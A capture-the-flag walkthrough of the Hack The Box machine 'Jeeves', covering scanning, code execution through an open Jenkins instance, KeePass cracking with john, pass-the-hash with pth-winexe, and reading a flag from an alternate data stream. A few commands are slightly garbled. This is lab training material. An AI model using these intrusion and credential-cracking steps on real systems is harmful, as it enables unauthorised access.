---
title: Jeeves
date: 2026-09-03
description: Medium Windows box with an unauthenticated Jenkins freestyle project for code execution, a KeePass database for the administrator NTLM hash, and the flag tucked in an NTFS alternate data stream.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Sep  3 10:53:10 2026 as: /usr/lib/nmap/nmap -p80,135,445,50000 -A -oN scan_results.txt 10.129.228.112
Nmap scan report for jeeves.htb (10.129.228.112)
Host is up (0.45s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-02T19:57:30
|_  start_date: 2026-09-02T18:12:40
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -18h56m10s, deviation: 0s, median: -18h56m11s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   532.09 ms 10.10.16.1
2   532.13 ms jeeves.htb (10.129.228.112)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  3 10:54:18 2026 -- 1 IP address (1 host up) scanned in 67.53 seconds
```

Port **80** serves an "Ask Jeeves" search page, while port **50000** runs Jetty but 404s with no index page.

So we brute-force it:

```sh
feroxbuster --url http://jeeves.htb:50000/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

`/askjeeves` reveals **Jenkins ver. 2.87**.

No auth needed — create a Freestyle project, then Build -> Add build step -> **Build Now**:

> https://www.toolsqa.com/postman/configure-jenkins-job-to-run-batch-command/

Open the build's console output to confirm it ran — we now have a shell as **kohsuke**.

# User

In kohsuke's Documents sits a KeePass database: `CEH.kdbx`.

Download it with impacket's `smbserver`:

```
keepassxc CEH.kdbx
```

The file is **password protected** — it needs a **master key** to open. Convert the **keepass** format to a **john** hash first:

```sh
keepass2john CEH.kdbx > keepasshash 

john --fomat=keepass --wordlist=/usr/share/wordlists/rockyou.txt keepasshash
```

> Master key - `moonshine1`

Opening it yields a single NTLM hash — `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00` — believed to be the administrator's.

`impacket-wmiexec` didn't work despite speaking SMB, and `evil-winrm` was out — no winrms service running on the target, so it's **pth-winexe** to pass the hash (-PassTheHash-):

```sh
pth-winexe -U jenkins/administrator //10.129.228.112 cmd.exe
```

# Root

```cmd
dir /A /R
```

- `/A` - list hidden files
- `/R` - list data streams hidden inside other files

The flag is stashed in an NTFS alternate data stream of `hm.txt`:

```cmd
powershell Get-Content -Path "hm.txt" -Stream "root.txt" 
```

Gained `root`
